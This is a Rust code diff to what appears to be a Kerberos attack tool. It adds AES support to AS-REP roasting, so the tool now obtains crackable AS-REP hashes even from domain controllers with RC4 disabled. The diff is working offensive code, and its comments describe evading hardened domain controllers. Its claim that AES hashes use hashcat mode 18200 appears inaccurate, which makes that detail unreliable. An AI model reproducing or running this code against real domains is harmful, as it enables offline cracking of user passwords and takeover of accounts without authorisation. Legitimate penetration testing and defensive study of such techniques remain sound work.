@@ -41,6 +41,7 @@ pub use tgs::{
 /// Kerberos encryption type numbers (RFC 3961/4120).
 pub const ETYPE_RC4_HMAC: u8 = 23;
 pub const ETYPE_AES256: u8 = 18;
+pub const ETYPE_AES128: u8 = 17;
 
 /// A roastable principal discovered from the snapshot.
 #[derive(Clone, Debug)]
@@ -127,10 +128,13 @@ fn build_as_req(user: &str, realm: &str) -> AsReq {
         )),
         rtime: Optional::from(None),
         nonce: ExplicitContextTag7::from(IntegerAsn1(nonce.to_vec())),
-        // RC4 only ⇒ hashcat 18200. AES-only accounts will yield a KDC error instead.
-        etype: ExplicitContextTag8::from(Asn1SequenceOf::from(vec![IntegerAsn1(vec![
-            ETYPE_RC4_HMAC,
-        ])])),
+        // Offer RC4 + AES256 + AES128: RC4-disabled DCs (Server 2025 default, hardened 2019/2022)
+        // then return a crackable AES AS-REP instead of KDC_ERR_ETYPE_NOSUPP — no silent miss.
+        etype: ExplicitContextTag8::from(Asn1SequenceOf::from(vec![
+            IntegerAsn1(vec![ETYPE_RC4_HMAC]),
+            IntegerAsn1(vec![ETYPE_AES256]),
+            IntegerAsn1(vec![ETYPE_AES128]),
+        ])),
         addresses: Optional::from(None),
         enc_authorization_data: Optional::from(None),
         additional_tickets: Optional::from(None),
@@ -232,10 +236,13 @@ pub async fn asrep_roast(c: &Candidate, kdc: &str) -> Result<String> {
          .0
         .iter()
         .fold(0u32, |a, &b| (a << 8) | b as u32);
-    if etype != ETYPE_RC4_HMAC as u32 {
-        bail!("AS-REP came back etype {etype}, not RC4 — account is AES-only");
+    match etype as u8 {
+        ETYPE_RC4_HMAC => Ok(format_asrep(&c.sam, &c.realm, &enc.cipher.0 .0)),
+        e @ (ETYPE_AES128 | ETYPE_AES256) => {
+            Ok(format_asrep_aes(&c.sam, &c.realm, e, &enc.cipher.0 .0))
+        }
+        other => bail!("AS-REP etype {other} not supported for roasting"),
     }
-    Ok(format_asrep(&c.sam, &c.realm, &enc.cipher.0 .0))
 }
 
 // ---------------------------------------------------------------------------
@@ -252,6 +259,22 @@ pub fn format_asrep(user: &str, realm: &str, enc_part: &[u8]) -> String {
         realm,
         hex::encode(&enc_part[..cut]),
         hex::encode(&enc_part[cut..])
+    )
+}
+
+/// hashcat `-m 18200` line for an AES AS-REP (etype 17/18):
+/// `$krb5asrep$<etype>$user@REALM:<checksum12>$<edata>` (AES puts the 12-byte HMAC last; hashcat
+/// wants checksum-then-edata, matching the AES TGS format).
+pub fn format_asrep_aes(user: &str, realm: &str, etype: u8, enc_part: &[u8]) -> String {
+    let split = enc_part.len().saturating_sub(12);
+    let (edata, checksum) = enc_part.split_at(split);
+    format!(
+        "$krb5asrep${}${}@{}:{}${}",
+        etype,
+        user,
+        realm,
+        hex::encode(checksum),
+        hex::encode(edata)
     )
 }
 
